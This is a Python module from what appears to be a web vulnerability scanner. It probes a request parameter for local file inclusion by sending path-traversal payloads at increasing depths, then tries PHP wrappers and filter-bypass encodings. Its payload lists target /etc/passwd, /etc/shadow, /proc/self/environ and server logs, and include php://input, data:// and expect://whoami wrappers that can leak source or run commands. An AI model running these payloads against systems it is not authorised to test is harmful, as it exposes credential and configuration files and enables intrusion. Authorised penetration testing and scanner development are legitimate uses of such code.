"""LFI Smart Probe — traversal-depth + PHP-wrapper aware payload generation."""

from __future__ import annotations

from utils.colors import log_info
from utils.request import ScanExceptions, smart_request

# PHP wrappers to test
_LFI_WRAPPERS = [
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=string.rot13/resource=index",
    "php://input",
    "data://text/plain;base64,PD9waHAgZWNobyAnTEZJX1RFU1QnOyA/Pg==",
    "expect://whoami",
]

_LFI_DEPTH_PAYLOADS = {
    1: "../etc/passwd",
    2: "../../etc/passwd",
    3: "../../../etc/passwd",
    4: "../../../../etc/passwd",
    5: "../../../../../etc/passwd",
    6: "../../../../../../etc/passwd",
    8: "../../../../../../../../etc/passwd",
    10: "../../../../../../../../../../etc/passwd",
}

_LFI_BYPASS_PAYLOADS = [
    "....//....//....//....//etc/passwd",  # Double-dot bypass
    "..%2f..%2f..%2f..%2fetc/passwd",  # URL encoding
    "..%252f..%252f..%252fetc/passwd",  # Double encoding
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",  # Dot encoding
    "....\\\\....\\\\....\\\\etc/passwd",  # Backslash
    "/etc/passwd%00",  # Null byte (PHP < 5.3)
    "/etc/passwd%00.php",
]


def probe_lfi_context(url, param, params, method="get", form_data=None, delay=0):
    """LFI smart probe: find traversal depth, test PHP wrappers, add bypass payloads."""
    from urllib.parse import urlencode, urlparse, urlunparse

    result = {
        "traversal_depth": None,
        "wrappers_work": False,
        "null_byte": False,
        "smart_payloads": [],
    }

    lfi_sigs = ["root:x:0:0:", "root:*:0:0:", "[boot loader]"]

    def _send(value):
        if method == "get":
            tp = params.copy()
            tp[param] = value
            parsed = urlparse(url)
            turl = urlunparse(parsed._replace(query=urlencode(tp)))
            return smart_request("get", turl, delay=delay)
        else:
            data = form_data.copy() if form_data else {}
            data[param] = value
            return smart_request("post", url, data=data, delay=delay)

    def _has_lfi_sig(text):
        for sig in lfi_sigs:
            if sig in text:
                return True
        return False

    try:
        payloads = []

        # Phase 1: Find traversal depth
        found_depth = None
        for depth, payload in sorted(_LFI_DEPTH_PAYLOADS.items()):
            try:
                resp = _send(payload)
                if _has_lfi_sig(resp.text):
                    found_depth = depth
                    payloads.insert(0, payload)
                    break
            except ScanExceptions:
                pass

        result["traversal_depth"] = found_depth

        if found_depth:
            log_info(
                f"  🧠 LFI Probe [{param}]: depth={found_depth} (../ × {found_depth})"
            )
            prefix = "../" * found_depth
            targets = [
                "etc/passwd",
                "etc/shadow",
                "etc/hosts",
                "etc/hostname",
                "proc/self/environ",
                "proc/self/cmdline",
                "proc/version",
                "var/log/apache2/access.log",
                "var/log/auth.log",
            ]
            for t in targets:
                payloads.append(prefix + t)

        # Phase 2: Test PHP wrappers (only need 1 request)
        try:
            wrapper = "php://filter/convert.base64-encode/resource=index"
            resp = _send(wrapper)
            import base64

            for chunk in resp.text.split():
                try:
                    decoded = base64.b64decode(chunk)
                    if len(decoded) > 20 and b"<?" in decoded:
                        result["wrappers_work"] = True
                        log_info("     ✅ PHP wrappers: ENABLED (source code leak!)")
                        payloads.extend(_LFI_WRAPPERS)
                        break
                except ScanExceptions:
                    pass
        except ScanExceptions:
            pass

        # Phase 3: Always add bypass payloads
        payloads.extend(_LFI_BYPASS_PAYLOADS)

        result["smart_payloads"] = payloads

        if payloads:
            log_info(f"  🧠 LFI Probe [{param}]: {len(payloads)} targeted payloads")

    except ScanExceptions:
        pass

    return result
